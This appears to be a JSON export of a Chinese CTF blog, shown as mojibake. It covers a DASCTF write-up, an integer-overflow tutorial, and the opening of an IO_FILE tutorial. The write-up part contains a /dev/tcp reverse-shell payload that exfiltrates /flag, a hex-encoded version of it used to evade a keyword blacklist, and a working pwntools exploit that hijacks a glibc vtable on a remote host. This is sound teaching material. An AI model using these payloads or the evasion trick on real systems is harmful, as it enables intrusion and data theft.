'False': result = \"Error\" else: result = \"Invalid\" except: result = \"Invalid\" return render_template('index.html', answer=result,question=create_question) if request.method == 'GET': create_question = create() session['question'] = create_question return render_template('index.html',question=create_question) @app.route('/source') def source(): return open(\"app.py\", \"r\").read() if __name__ == '__main__': app.run(host=\"0.0.0.0\", debug=False) åå¼¹shellï¼Œèµ·åˆé»‘åå•åªæœ‰orï¼Œç”¨ä¸‹é¢payloadå³å¯ï¼š os.system('bash -c \\\"cat /flag &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\\"') æ”¹äº†ä¹‹åosã€importã€systeméƒ½è¢«banäº†ï¼Œåªèƒ½ç¼–ç ç»•è¿‡ï¼Œè¿™é‡Œé‡‡ç”¨hexç¼–ç ï¼Œå…ˆå¯¹ä¸Šé¢çš„payloadè½¬ä¸ºhexï¼š 6f732e73797374656d282762617368202d63205c22636174202f666c6167203e26202f6465762f7463702f69702f706f727420303e26315c222729 ç„¶ååˆ©ç”¨bytes.fromhex()å‡½æ•°è½¬æ¢ byteså¯¹è±¡çš„hexå‡½æ•°ï¼Œç”¨æ¥å°†byteså¯¹è±¡çš„å€¼è½¬æ¢æˆhexstrï¼›è€Œfromhexå‡½æ•°ï¼Œç”¨æ¥å°†hexstrå¯¼å…¥byteså¯¹è±¡ï¼Œç›¸å½“äºç”¨hexstræ¥åˆ›å»ºbyteså¯¹è±¡ã€‚ &gt;&gt;&gt; bytes([0,1,2,3,4,5]).hex()'000102030405'&gt;&gt;&gt; bytes.fromhex('000102030405')b'\\x00\\x01\\x02\\x03\\x04\\x05'&gt;&gt;&gt; b'abcde'.hex()'6162636465'&gt;&gt;&gt; a = bytes.fromhex('6162636465')&gt;&gt;&gt; ab'abcde' ç»“åˆexec()å‡½æ•°å³å¯æ‰§è¡Œåå¼¹shellï¼š exec(bytes.fromhex('6f732e73797374656d282762617368202d63205c22636174202f666c6167203e26202f6465762f7463702f69702f706f727420303e26315c222729')) secretæœ¬é¢˜è¿è¡Œæ—¶è¾“å‡ºäº†printfå‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”å¼€å¯äº†canaryï¼ŒåŸæœ¬ä»¥ä¸ºå¯ä»¥é€šè¿‡å®ƒæ³„éœ²canaryï¼Œç„¶åå†æ¬¡æº¢å‡ºæ‹¿shellçš„ï¼Œå¯æ˜¯å°è¯•ä¹‹åæ˜¯æ— æ³•è¦†ç›–canaryçš„ä½å­—èŠ‚ä»è€Œå°†å…¶æ³„éœ²ã€‚çœ‹åˆ°å¸ˆå‚…ä»¬çš„wpå¾—çŸ¥æ˜¯_IO_FILEçš„é¢˜ï¼Œä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹ã€‚ é¢˜ç›®åˆ†æå…ˆçœ‹çœ‹è¿œç¨‹çš„libcæ˜¯ä»€ä¹ˆç‰ˆæœ¬ï¼Œæ ¹æ® printf çš„åœ°å€ï¼ŒæŸ¥åˆ°å¤šä¸ªï¼Œæœ€åç¡®å®šäº†æ˜¯ libc2.29 libc2.29ä¸­çš„vtablelibc2.29 è²Œä¼¼ä¸èƒ½ä¿®æ”¹ vtable çš„å†…å®¹ï¼Œè€Œä¸”å¯¹ vtable æŒ‡é’ˆæœ‰è¦æ±‚ï¼Œä½†æ˜¯ vtable æŒ‡é’ˆé™„è¿‘åå·®ä¸å¤§çš„åœ°æ–¹éƒ½æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œè€Œä¸”å¯å†™ã€‚ é‚£ä¹ˆå°±ä¿®æ”¹ __IO_2_1_stderr çš„ vtable æŒ‡é’ˆçš„ä½ä¸¤å­—èŠ‚ï¼ˆåªè¦å’ŒåŸæ¥çš„ä½ç½®åå·®ä¸å¤§ï¼Œè€Œä¸”å¯å†™å°±è¡Œï¼Œéœ€è¦çˆ†ç ´)ï¼Œç„¶åå¾€æ–°çš„æŒ‡é’ˆæŒ‡å‘çš„åœ°å€å†™ 3 ä¸ª qwordï¼Œç¬¬ä¸‰ä¸ªåˆšå¥½å°±æ˜¯ io_finish çš„ä½ç½®ï¼Œå¡«ä¸Šone_gadget å³å¯ã€‚ vtable å‡½æ•° æŒ‡é’ˆï¼š /* The 'finish' function does any final cleaning up of an _IO_FILE object. It does not delete (free) it, but does everything else to finalize it. It matches the streambuf::~streambuf virtual destructor. */typedef void (*_IO_finish_t) (FILE *, int); /* finalize */#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)struct _IO_jump_t{ JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);}; å¯¹äºæ”»å‡»çš„vtable å‡½æ•° æŒ‡é’ˆå…¶ä¸­çš„ï¼š __finish__ __close å…¶æ‰§è¡Œé¡ºåºæ˜¯å…ˆcloseï¼Œç„¶åfinishã€‚ç”±äºç¨‹åºç»™çš„æ˜¯0x18å­—èŠ‚çš„ä»»æ„å†™ï¼Œæ”»å‡» __finish__å°±å¯ä»¥äº†ã€‚ vtableçš„å€¼ï¼Œä»¥åŠå…¶å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨glibc 2.29ä¸‹æ˜¯å¯å†™çš„ã€‚è¿™ä¸ªæ˜¯å¾ˆé‡è¦çš„ä¸€ç‚¹ï¼Œæœ¬æ¥ä¸ªäººä¸çŸ¥é“è¿™ä¸ªï¼Œæƒ³äº†å¥½ä¹…å…¶ä»–çš„åŠæ³•æ¥åˆ©ç”¨ã€‚ åœ¨glibc 2.23ä»¥åŠglibc 2.27å…¶éƒ½æ˜¯ä¸å¯å†™çš„ã€‚ æ”»å‡»æ€è·¯åˆ©ç”¨ç¨‹åºçš„æœ€åä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œç›´æ¥æŠŠ__IO_2_1_stderrä¸Šçš„vtable__finish__æŒ‡é’ˆä¿®æ”¹ä¸ºone gadgetã€‚ expå‚è€ƒå¤§ä½¬çš„è„šæœ¬ï¼š #coding=utf8'''è„šæœ¬ä½¿ç”¨çš„åº“ä¸ºwelpwn(githubå¯æœ)'''from PwnContext import * context.terminal = ['gnome-terminal', '-x', 'sh', '-c']context.log_level = 'debug'# functions for quick scripts = lambda data :ctx.send(str(data)) #in case that data is an intsa = lambda delim,data :ctx.sendafter(str(delim), str(data)) sl = lambda data :ctx.sendline(str(data)) sla = lambda delim,data :ctx.sendlineafter(str(delim), str(data)) r = lambda numb=4096,timeout=2:ctx.recv(numb, timeout=timeout)ru = lambda delims, drop=True :ctx.recvuntil(delims, drop)irt = lambda :ctx.interactive()rs = lambda *args, **kwargs :ctx.start(*args, **kwargs)dbg = lambda gs='', **kwargs :ctx.debug(gdbscript=gs, **kwargs)# misc functionsuu32 = lambda data :u32(data.ljust(4, '\\x00'))uu64 = lambda data :u64(data.ljust(8, '\\x00'))leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))ctx.binary = './secret'ctx.remote = ('183.129.189.60', 10030)ctx.remote_libc = './libc.so' # libc-2.29ctx.debug_remote_libc = True#rs()rs('remote')ru('secret:')printf = int(ru('\\n', drop=True), 16)leak('printf', printf)lbase = printf - ctx.libc.sym['printf']leak('lbase', lbase)_IO_2_1_stderr_ = lbase + ctx.libc.sym['_IO_2_1_stderr_']vtable = _IO_2_1_stderr_ + 0xd8leak('_IO_2_1_stderr_', _IO_2_1_stderr_)leak('vtable', vtable)one1 = lbase + 0xe237fone2 = lbase + 0xe2383one3 = lbase + 0xe2386one4 = lbase + 0x106ef8s(p64(vtable))s('\\xf0\\x70') # ä¿®æ”¹vtableåœ°å€ä½ä¸¤å­—èŠ‚ s(p64(0) + p64(0) + p64(one3))irt()","link":"/2020/06/25/DASCTF%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/"},{"title":"æ•´å½¢æº¢å‡ºåŸºç¡€","text":"C è¯­è¨€ä¸­ï¼Œæ•´æ•°çš„åŸºæœ¬æ•°æ®ç±»å‹åˆ†ä¸ºçŸ­æ•´å‹ (short)ï¼Œæ•´å‹ (int)ï¼Œé•¿æ•´å‹ (long)ï¼Œè¿™ä¸‰ä¸ªæ•°æ®ç±»å‹è¿˜åˆ†ä¸ºæœ‰ç¬¦å·å’Œæ— ç¬¦å·ï¼Œæ¯ç§æ•°æ®ç±»å‹éƒ½æœ‰å„è‡ªçš„å¤§å°èŒƒå›´ï¼ˆæ•°æ®ç±»å‹çš„å¤§å°èŒƒå›´æ˜¯ç¼–è¯‘å™¨å†³å®šï¼‰ï¼Œå½“ç¨‹åºä¸­çš„æ•°æ®è¶…è¿‡å…¶æ•°æ®ç±»å‹çš„èŒƒå›´ï¼Œåˆ™ä¼šé€ æˆæº¢å‡ºï¼Œæ•´æ•°ç±»å‹çš„æº¢å‡ºè¢«ç§°ä¸ºæ•´æ•°æº¢å‡ºã€‚ æ•´æ•°çš„è¡¨ç¤ºèŒƒå›´ä»¥åŠå­—èŠ‚æ•°å¦‚ä¸‹è¡¨ï¼š æº¢å‡ºåŸç†æ•´å‹æº¢å‡ºä¸»è¦åˆ†ä¸ºä¸Šç•Œæº¢å‡ºå’Œä¸‹ç•Œæº¢å‡ºï¼Œä¸‹é¢åˆ†åˆ«è¿›è¡Œä»‹ç»ã€‚ ä¸Šç•Œæº¢å‡ºå…ˆçœ‹ä»£ç ï¼š # ä¼ªä»£ç short int a;a = a + 1;# å¯¹åº”çš„æ±‡ç¼–movzx eax, word ptr [rbp - 0x1c]add eax, 1mov word ptr [rbp - 0x1c], axunsigned short int b;b = b + 1;# assembly codeadd word ptr [rbp - 0x1a], 1 ä¸Šç•Œæº¢å‡ºæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯ 0x7fff + 1ï¼Œ å¦ä¸€ç§æ˜¯ 0xffff + 1ã€‚ å› ä¸ºè®¡ç®—æœºåº•å±‚æŒ‡ä»¤æ˜¯ä¸åŒºåˆ†æœ‰ç¬¦å·å’Œæ— ç¬¦å·çš„ï¼Œæ•°æ®éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜åœ¨ (ç¼–è¯‘å™¨çš„å±‚é¢æ‰å¯¹æœ‰ç¬¦å·å’Œæ— ç¬¦å·è¿›è¡ŒåŒºåˆ†ï¼Œäº§ç”Ÿä¸åŒçš„æ±‡ç¼–æŒ‡ä»¤)ã€‚ æ‰€ä»¥ add 0x7fff, 1 == 0x8000ï¼Œè¿™ç§ä¸Šç•Œæº¢å‡ºå¯¹æ— ç¬¦å·æ•´å‹å°±æ²¡æœ‰å½±å“ï¼Œä½†æ˜¯åœ¨æœ‰ç¬¦å·çŸ­æ•´å‹ä¸­ï¼Œ0x7fff è¡¨ç¤ºçš„æ˜¯ 32767ï¼Œä½†æ˜¯ 0x8000 è¡¨ç¤ºçš„æ˜¯ -32768ï¼Œç”¨æ•°å­¦è¡¨è¾¾å¼æ¥è¡¨ç¤ºå°±æ˜¯åœ¨æœ‰ç¬¦å·çŸ­æ•´å‹ä¸­ 32767+1 == -32768ã€‚ ç¬¬äºŒç§æƒ…å†µæ˜¯ add 0xffff, 1ï¼Œè¿™ç§æƒ…å†µéœ€è¦è€ƒè™‘çš„æ˜¯ç¬¬ä¸€ä¸ªæ“ä½œæ•°ã€‚ æ¯”å¦‚ä¸Šé¢çš„æœ‰ç¬¦å·å‹åŠ æ³•çš„æ±‡ç¼–ä»£ç æ˜¯ add eax, 1ï¼Œå› ä¸º eax=0xffffï¼Œæ‰€ä»¥ add eax, 1 == 0x10000ï¼Œä½†æ˜¯æ— ç¬¦å·çš„æ±‡ç¼–ä»£ç æ˜¯å¯¹å†…å­˜è¿›è¡ŒåŠ æ³•è¿ç®— add word ptr [rbp - 0x1a], 1 == 0x0000ã€‚ åœ¨æœ‰ç¬¦å·çš„åŠ æ³•ä¸­ï¼Œè™½ç„¶ eax çš„ç»“æœä¸º 0x10000ï¼Œä½†æ˜¯åªæŠŠ ax=0x0000 çš„å€¼å‚¨å­˜åˆ°äº†å†…å­˜ä¸­ï¼Œä»ç»“æœçœ‹å’Œæ— ç¬¦å·æ˜¯ä¸€æ ·çš„ã€‚ å†ä»æ•°å­—å±‚é¢çœ‹çœ‹è¿™ç§æº¢å‡ºçš„ç»“æœï¼Œåœ¨æœ‰ç¬¦å·çŸ­æ•´å‹ä¸­ï¼Œ0xffff==-1ï¼Œ-1 + 1 == 0ï¼Œä»æœ‰ç¬¦å·çœ‹è¿™ç§è®¡ç®—æ²¡é—®é¢˜ã€‚ ä½†æ˜¯åœ¨æ— ç¬¦å·çŸ­æ•´å‹ä¸­ï¼Œ0xffff == 65535, 65535 + 1 == 0ã€‚ ä¸‹ç•Œæº¢å‡ºä¸‹å±Šæº¢å‡ºçš„é“ç†å’Œä¸Šç•Œæº¢å‡ºä¸€æ ·ï¼Œåœ¨æ±‡ç¼–ä»£ç ä¸­ï¼Œåªæ˜¯æŠŠ add æ›¿æ¢æˆäº† subã€‚ ä¸€æ ·ä¹Ÿæ˜¯æœ‰ä¸¤ç§æƒ…å†µï¼š ç¬¬ä¸€ç§æ˜¯ sub 0x0000, 1 == 0xffffï¼Œå¯¹äºæœ‰ç¬¦å·æ¥è¯´ 0 - 1 == -1 æ²¡é—®é¢˜ï¼Œä½†æ˜¯å¯¹äºæ— ç¬¦å·æ¥è¯´å°±æˆäº† 0 - 1 == 65535ã€‚ ç¬¬äºŒç§æ˜¯ sub 0x8000, 1 == 0x7fffï¼Œå¯¹äºæ— ç¬¦å·æ¥è¯´æ˜¯ 32768 - 1 == 32767 æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯å¯¹äºæœ‰ç¬¦å·æ¥è¯´å°±å˜æˆäº† -32768 - 1 = 32767ã€‚ å…¸ä¾‹å¸¸è§çš„æ•´å‹æº¢å‡ºå¯ä»¥æ€»ç»“ä¸ºä¸¤ç§æƒ…å†µ æœªé™åˆ¶èŒƒå›´è¿™ç§æ¼æ´ç”±äºå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°å€¼æœªè¿›è¡Œè¿‡æ»¤æ£€æŸ¥è€Œå¯¼è‡´ï¼Œä¾‹å­å¦‚ä¸‹ï¼š $ cat test.c#include&lt;stddef.h&gt;int main(void){ int len; int data_len; int header_len; char *buf; header_len = 0x10; scanf(\"%uld\", &amp;data_len); len = data_len+header_len buf = malloc(len); read(0, buf, data_len); return 0;}$ gcc test.c$ ./a.out-1asdfasfasdfasdfafasfasfasdfasdf# gdb a.outâ–º 0x40066d &lt;main+71&gt; call malloc@plt &lt;0x400500&gt; size: 0xf åªç”³è¯· 0x20 å¤§å°çš„å †ï¼Œä½†æ˜¯å´èƒ½è¾“å…¥ 0xffffffff é•¿åº¦çš„æ•°æ®ï¼Œä»æ•´å‹æº¢å‡ºåˆ°å †æº¢å‡ºã€‚ é”™è¯¯çš„ç±»å‹è½¬æ¢å³ä½¿æ­£ç¡®çš„å¯¹å˜é‡è¿›è¡Œçº¦æŸï¼Œä¹Ÿä»ç„¶æœ‰å¯èƒ½å‡ºç°æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œæˆ‘è®¤ä¸ºå¯ä»¥æ¦‚æ‹¬ä¸ºé”™è¯¯çš„ç±»å‹è½¬æ¢ï¼Œå¦‚æœç»§ç»­ç»†åˆ†ä¸‹å»ï¼Œå¯ä»¥åˆ†ä¸ºï¼š 1ã€èŒƒå›´å¤§çš„å˜é‡èµ‹å€¼ç»™èŒƒå›´å°çš„å˜é‡ $ cat test2.cvoid check(int n){ if (!n) printf(\"vuln\"); else printf(\"OK\");}int main(void){ long int a; scanf(\"%ld\", &amp;a); if (a == 0) printf(\"Bad\"); else check(a); return 0;}$ gcc test2.c$ ./a.out4294967296vuln ä¸Šè¿°ä»£ç å°±æ˜¯ä¸€ä¸ªèŒƒå›´å¤§çš„å˜é‡ (é•¿æ•´å‹ a)ï¼Œä¼ å…¥ check å‡½æ•°åå˜ä¸ºèŒƒå›´å°çš„å˜é‡ (æ•´å‹å˜é‡ n)ï¼Œé€ æˆæ•´æ•°æº¢å‡ºçš„ä¾‹å­ã€‚ å·²çŸ¥é•¿æ•´å‹çš„å æœ‰ 8 byte çš„å†…å­˜ç©ºé—´ï¼Œè€Œæ•´å‹åªæœ‰ 4 byte çš„å†…å­˜ç©ºé—´ï¼Œæ‰€ä»¥å½“ long -&gt; intï¼Œå°†ä¼šé€ æˆæˆªæ–­ï¼ŒåªæŠŠé•¿æ•´å‹çš„ä½ 4byte çš„å€¼ä¼ ç»™æ•´å‹å˜é‡ã€‚ åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œå°±æ˜¯æŠŠ long: 0x100000000 -&gt; int: 0x00000000ã€‚ ä½†æ˜¯å½“èŒƒå›´æ›´å°çš„å˜é‡å°±èƒ½å®Œå…¨çš„æŠŠå€¼ä¼ é€’ç»™èŒƒå›´æ›´å¤§çš„å˜é‡ï¼Œè€Œä¸ä¼šé€ æˆæ•°æ®ä¸¢å¤±ã€‚ 2ã€åªåšäº†å•è¾¹é™åˆ¶ è¿™ç§æƒ…å†µåªé’ˆå¯¹æœ‰ç¬¦å·ç±»å‹ï¼š $ cat test3.cint main(void){ int len, l; char buf[11]; scanf(\"%d\", &amp;len); if (len &lt; 10) { l = read(0, buf, len); *(buf+l) = 0; puts(buf); } else printf(\"Please len &lt; 10\"); }$ gcc test3.c$ ./a.out-1aaaaaaaaaaaaaaaaaaaaaaaa ä»è¡¨é¢ä¸Šçœ‹ï¼Œæˆ‘ä»¬å¯¹å˜é‡ len è¿›è¡Œäº†é™åˆ¶ï¼Œä½†æ˜¯ä»”ç»†æ€è€ƒå¯ä»¥å‘ç°ï¼Œlen æ˜¯æœ‰ç¬¦å·æ•´å‹ï¼Œæ‰€ä»¥ len çš„é•¿åº¦å¯ä»¥ä¸ºè´Ÿæ•°ï¼Œä½†æ˜¯åœ¨ read å‡½æ•°ä¸­ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°çš„ç±»å‹æ˜¯ size_tï¼Œè¯¥ç±»å‹ç›¸å½“äº unsigned long intï¼Œå±äºæ— ç¬¦å·é•¿æ•´å‹ ä¸Šé¢ä¸¾ä¾‹çš„ä¸¤ç§æƒ…å†µéƒ½æœ‰ä¸€ä¸ªå…±æ€§ï¼Œå°±æ˜¯å‡½æ•°çš„å½¢å‚å’Œå®å‚çš„ç±»å‹ä¸åŒï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºå¯ä»¥æ€»ç»“ä¸ºé”™è¯¯çš„ç±»å‹è½¬æ¢ã€‚","link":"/2020/06/17/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"},{"title":"IO-FILEç›¸å…³","text":"FILE åœ¨ Linux ç³»ç»Ÿçš„æ ‡å‡† IO åº“ä¸­æ˜¯ç”¨äºæè¿°æ–‡ä»¶çš„ç»“æ„ï¼Œç§°ä¸ºæ–‡ä»¶æµã€‚ FILE ç»“æ„åœ¨ç¨‹åºæ‰§è¡Œ fopen ç­‰å‡½æ•°æ—¶ä¼šè¿›è¡Œåˆ›å»ºï¼Œå¹¶åˆ†é…åœ¨å †ä¸­ã€‚ FILEç»“æ„å®šä¹‰ä¸€ä¸ªæŒ‡å‘ FILE ç»“æ„çš„æŒ‡é’ˆæ¥æ¥æ”¶è¿™ä¸ªè¿”å›å€¼ã€‚FILE ç»“æ„å®šä¹‰åœ¨ libio.h ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤º struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE}; è¿›ç¨‹ä¸­çš„ FILE ç»“æ„ä¼šé€šè¿‡_chain åŸŸå½¼æ­¤è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼Œé“¾è¡¨å¤´éƒ¨ç”¨å…¨å±€å˜é‡_IO_list_all è¡¨ç¤ºï¼Œé€šè¿‡è¿™ä¸ªå€¼æˆ‘ä»¬å¯ä»¥éå†æ‰€æœ‰çš„ FILE ç»“æ„ã€‚ åœ¨æ ‡å‡† I/O åº“ä¸­ï¼Œæ¯ä¸ªç¨‹åºå¯åŠ¨æ—¶æœ‰ä¸‰ä¸ªæ–‡ä»¶æµæ˜¯è‡ªåŠ¨æ‰“å¼€çš„ï¼šstdinã€stdoutã€stderrã€‚å› æ­¤åœ¨åˆå§‹çŠ¶æ€ä¸‹ï¼Œ_IO_list_all æŒ‡å‘äº†ä¸€ä¸ªæœ‰è¿™äº›æ–‡ä»¶æµæ„æˆçš„é“¾è¡¨ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸‰ä¸ªæ–‡ä»¶æµä½äº libc.so çš„æ•°æ®æ®µã€‚è€Œæˆ‘ä»¬ä½¿ç”¨ fopen åˆ›å»ºçš„æ–‡ä»¶æµæ˜¯åˆ†é…åœ¨å †å†…å­˜ä¸Šçš„ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ libc.so ä¸­æ‰¾åˆ° stdin\\stdout\\stderr ç­‰ç¬¦å·ï¼Œè¿™äº›ç¬¦å·æ˜¯æŒ‡å‘ FILE ç»“æ„çš„æŒ‡é’ˆï¼ŒçœŸæ­£ç»“æ„çš„ç¬¦å·æ˜¯ï¼š _IO_2_1_stderr__IO_2_1_stdout__IO_2_1_stdin_ ä½†æ˜¯äº‹å®ä¸Š_IO_FILE ç»“æ„å¤–åŒ…è£¹ç€å¦ä¸€ç§ç»“æ„_IO_FILE_plusï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ªé‡è¦çš„æŒ‡é’ˆ vtable æŒ‡å‘äº†ä¸€ç³»åˆ—å‡½æ•°æŒ‡é’ˆã€‚ åœ¨ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œ32 ä½çš„ vtable åç§»ä¸º 0x94ï¼Œ64 ä½åç§»ä¸º 0xd8 struct _IO_FILE_plus{ _IO_FILE file; IO_jump_t *vtable;} vtable æ˜¯ IO_jump_t ç±»å‹çš„æŒ‡é’ˆï¼ŒIO_jump_t ä¸­ä¿å­˜äº†ä¸€äº›å‡½æ•°æŒ‡é’ˆï¼Œåœ¨åé¢æˆ‘ä»¬ä¼šçœ‹åˆ°åœ¨ä¸€ç³»åˆ—æ ‡å‡† IO å‡½æ•°ä¸­ä¼šè°ƒç”¨è¿™äº›å‡½æ•°æŒ‡é’ˆï¼š void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue}; ç›¸å…³å‡½æ•°freadfread æ˜¯æ ‡å‡† IO åº“å‡½æ•°ï¼Œä½œç”¨æ˜¯ä»æ–‡ä»¶æµä¸­è¯»æ•°æ®ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹ï¼š size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ; buffer å­˜æ”¾è¯»å–æ•°æ®çš„ç¼“å†²åŒºã€‚ sizeï¼šæŒ‡å®šæ¯ä¸ªè®°å½•çš„é•¿åº¦ã€‚ countï¼š æŒ‡å®šè®°å½•çš„ä¸ªæ•°ã€‚ streamï¼šç›®æ ‡æ–‡ä»¶æµã€‚ è¿”å›å€¼ï¼šè¿”å›è¯»å–åˆ°æ•°æ®ç¼“å†²åŒºä¸­çš„è®°å½•ä¸ªæ•° fread çš„ä»£ç ä½äº / libio/iofread.c ä¸­ï¼Œå‡½æ•°åä¸º\\_IO_freadï¼Œä½†çœŸæ­£çš„åŠŸèƒ½å®ç°åœ¨å­å‡½æ•°_IO_sgetn ä¸­ã€‚ _IO_size_t_IO_fread (buf, size, count, fp) void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE *fp;{ ... bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); ...} åœ¨\\_IO_sgetn å‡½æ•°ä¸­ä¼šè°ƒç”¨\\_IO_XSGETNï¼Œè€Œ\\_IO_XSGETN æ˜¯_IO_FILE_plus.vtable ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ä¼šé¦–å…ˆå–å‡º vtable ä¸­çš„æŒ‡é’ˆç„¶åå†è¿›è¡Œè°ƒç”¨ã€‚ _IO_size_t_IO_sgetn (fp, data, n) _IO_FILE *fp; void *data; _IO_size_t n;{ return _IO_XSGETN (fp, data, n);} åœ¨é»˜è®¤æƒ…å†µä¸‹å‡½æ•°æŒ‡é’ˆæ˜¯æŒ‡å‘_IO_file_xsgetn å‡½æ•°çš„ if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) { if (__underflow (fp) == EOF) break; continue; } fwritefwrite åŒæ ·æ˜¯æ ‡å‡† IO åº“å‡½æ•°ï¼Œä½œç”¨æ˜¯å‘æ–‡ä»¶æµå†™å…¥æ•°æ®ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹ size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream); buffer: æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå¯¹ fwrite æ¥è¯´ï¼Œæ˜¯è¦å†™å…¥æ•°æ®çš„åœ°å€; size: è¦å†™å…¥å†…å®¹çš„å•å­—èŠ‚æ•°; count: è¦è¿›è¡Œå†™å…¥ size å­—èŠ‚çš„æ•°æ®é¡¹çš„ä¸ªæ•°; stream: ç›®æ ‡æ–‡ä»¶æŒ‡é’ˆ; è¿”å›å€¼ï¼šå®é™…å†™å…¥çš„æ•°æ®é¡¹ä¸ªæ•° countã€‚ fwrite çš„ä»£ç ä½äº /libio/iofwrite.c ä¸­ï¼Œå‡½æ•°åä¸º\\_IO_fwriteã€‚ åœ¨_IO_fwrite ä¸­ä¸»è¦æ˜¯è°ƒç”¨_IO_XSPUTN æ¥å®ç°å†™å…¥çš„åŠŸèƒ½ã€‚ æ ¹æ®å‰é¢å¯¹\\_IO_FILE_plus çš„ä»‹ç»ï¼Œå¯çŸ¥\\_IO_XSPUTN ä½äº_IO_FILE_plus çš„ vtable ä¸­ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°éœ€è¦é¦–å…ˆå–å‡º vtable ä¸­çš„æŒ‡é’ˆï¼Œå†è·³è¿‡å»è¿›è¡Œè°ƒç”¨ã€‚ written = _IO_sputn (fp, (const char *) buf, request); åœ¨\\_IO_XSPUTN å¯¹åº”çš„é»˜è®¤å‡½æ•°\\_IO_new_file_xsputn ä¸­ä¼šè°ƒç”¨åŒæ ·ä½äº vtable ä¸­çš„_IO_OVERFLOW /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) \\_IO_OVERFLOW é»˜è®¤å¯¹åº”çš„å‡½æ•°æ˜¯_IO_new_file_overflow if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; åœ¨_IO_new_file_overflow å†…éƒ¨æœ€ç»ˆä¼šè°ƒç”¨ç³»ç»Ÿæ¥å£ write å‡½æ•°ã€‚ fopenfopen åœ¨æ ‡å‡† IO 